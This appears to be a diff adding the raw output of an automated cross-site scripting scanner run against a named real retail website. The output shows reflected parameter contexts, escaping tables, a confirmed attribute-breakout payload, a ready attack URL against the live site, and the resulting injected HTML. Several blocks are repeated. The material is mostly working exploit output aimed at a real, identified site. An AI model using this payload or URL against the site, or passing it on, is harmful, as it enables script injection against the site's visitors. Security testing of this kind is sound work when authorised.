@@ -1,0 +1,63 @@
+https://www.redrivercatalog.com
+
+GET Params:[1]
+['addsearch']
+_______________________________________________________________________________________________________
+https://www.redrivercatalog.com/search.html?addsearch=/uvw"xyz'yxz<zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<input type="search" class="form-control" placeholder="Search" aria-label="search" aria-describedby="search" name="addsearch" value="/uvw"xyz'yxz<zxy">
+<input type="search" class="form-control" placeholder="Search" aria-label="search" aria-describedby="search" name="addsearch" value="/uvw"xyz'yxz<zxy">
+<input class="form-control" style="display:inline-block; width:auto" type="text" name="addsearch" id="Search" class="textfield" value="/uvw&quot;xyz'yxz&lt;zxy"/>
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<span class="text-monospace">/uvw&quot;xyz'yxz&lt;zxy</span>
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<a class="btn btn-outline-primary" href="/red-river-product-finder.html?search=/uvw"xyz'yxz<zxy">
+
+----------------------------------------------------------------------------------
+
+	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+ATTR:		False	True	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert`1`']
+
+ATTR Attack Url: https://www.redrivercatalog.com/search.html?addsearch=" onmouseover="alert`1`
+
+=>Detection  Successful with Payload: " onmouseover="alert`1`
+
+FINAL OUTPUT: 
+<input type="search" class="form-control" placeholder="Search" aria-label="search" aria-describedby="search" name="addsearch" value="" onmouseover="alert`1`">
+<input type="search" class="form-control" placeholder="Search" aria-label="search" aria-describedby="search" name="addsearch" value="" onmouseover="alert`1`">
+<a class="btn btn-outline-primary" href="/red-river-product-finder.html?search=" onmouseover="alert`1`">
+	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+ATTR:		False	True	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert`1`']
+
+ATTR Attack Url: https://www.redrivercatalog.com/search.html?addsearch=" onmouseover="alert`1`
+
+=>Detection  Successful with Payload: " onmouseover="alert`1`
+
+FINAL OUTPUT: 
+<input type="search" class="form-control" placeholder="Search" aria-label="search" aria-describedby="search" name="addsearch" value="" onmouseover="alert`1`">
+<input type="search" class="form-control" placeholder="Search" aria-label="search" aria-describedby="search" name="addsearch" value="" onmouseover="alert`1`">
+<a class="btn btn-outline-primary" href="/red-river-product-finder.html?search=" onmouseover="alert`1`">
+	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
+Mitigation        "	'	<	/ 
+ATTR:		True	True	True	False
+Mitigation        "	'	<	/ 
+HTML:		True	False	True	False
+Mitigation        "	'	<	/ 
+URL:		False	False	False	False
